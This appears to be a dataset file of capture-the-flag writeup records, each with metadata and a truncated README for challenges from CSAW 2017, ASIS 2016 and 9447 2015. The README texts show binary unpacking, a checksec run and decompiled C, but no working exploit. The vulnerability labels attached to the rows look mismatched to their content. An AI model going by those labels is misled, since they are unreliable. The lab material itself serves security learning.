ctf_writeup,writeups-112,writeups,csaw-quals-2017/pwn/minesweeper/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-quals-2017) [](type=exploit) [](tags=arbitrary-size) [](techniques=shellcode) # minesweeper (pwn-500) [Binary](../minesweeper) ```bash $ file minesweeper minesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped ``` This solution would make you think that this challenge was not worth 500. Lets solve it without reversing the binary at all. The binary is UPX packed, so we first unpack it. ```bash $ cp minesweeper upx $ upx -d upx Ultimate Packer for eXecutables Copyright (C) 1996 - 2013 UPX 3.91 Markus Oberhumer, Laszlo Molnar & John Reiser Sep 30th 2013 File size Ratio Format Name -------------------- ------ ----------- ----------- 13132 <- 7936 60.43% netbsd/elf386 upx Unpacked 1 file. $ file upx upx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=90ec16e6be18b19942bf2952db17a7c1ed3ca482, stripped $ checksec upx Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments ``` This makes more sense. A pwn worth 500 with no protections??? seriously?? When we run it it s"
ctf_writeup,writeups-113,writeups,asis-ctf-finals-2016/pwn/diapers-simulator/sudhackar/README.md,sudhackar,format_string,[](ctf=asis-ctf-finals-2016) [](type=exploit) [](tags=format string) [](tools=libformatstr) [](techniques=format string) # diapers-simulator (pwn-134) ![image](../diapers.png) [Binary](../diapers) [Solution](diapers.py)
ctf_writeup,writeups-114,writeups,9447-2015/reversing/The *real* flag finder/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=9447-2015) [](type=reversing) [](tags=xor,memcmp) [](tools=gdb-peda,Hopper) # The *real* flag finder (Reversing 70) So we are given an [executable](../flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524). ```bash $ file flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524 flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8c0c9c0d5c39ff0cc1954fa8682288b6169b8fff, stripped ``` A quick decompilation. ```c if ( argc == 2 ) { v10 = (unsigned int)n - 1LL; v3 = alloca(16 * (((unsigned __int64)(unsigned int)n + 15) / 0x10)); dest = (char *)&v6; strcpy((char *)&v6, src); v9 = 0; v8 = 0; while ( memcmp(dest, ""9447"", 4uLL) ) { v4 = v8 % (unsigned int)n; v5 = dest[v8 % (unsigned int)n]; dest[v4] = (unsigned __int64)sub_40060D() ^ v5; ++v8; } if ( !memcmp(dest, *(const void **)(v6 + 8), (unsigned int)n) ) printf(""The flag is %s\n"", *(_QWORD *)(v6 + 8), v6); else puts(""Try again""); result = 0LL; } else { printf(""Usage: %s <password>\n"", *(_QWORD *)v6, v6); result = 1LL; } return result; ``` As it is quite clear all we have to do is to check the las"
